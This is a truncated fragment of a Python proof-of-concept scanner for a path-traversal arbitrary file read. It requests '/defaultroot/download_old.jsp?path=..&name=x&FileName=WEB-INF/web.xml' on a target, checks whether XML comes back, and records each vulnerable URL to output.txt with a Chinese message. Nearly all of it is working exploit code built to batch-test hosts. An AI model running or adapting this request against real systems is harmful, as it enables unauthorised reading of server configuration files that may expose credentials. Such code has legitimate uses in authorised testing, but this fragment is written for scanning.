...
def poc(url):
    try:
        target = urljoin(url,"/defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml")
        header = {
        ...
        if res.status_code == 200 and 'xml' in res.text:
            print(Fore.GREEN + url +'[+]存在downloda任意文件读取漏洞')
            with open(r'output.txt', 'a+') as w:
                w.write(url+"存在downloda任意文件读取漏洞"'\n')
            print("[" + "-" * 80 + "]")
        else:
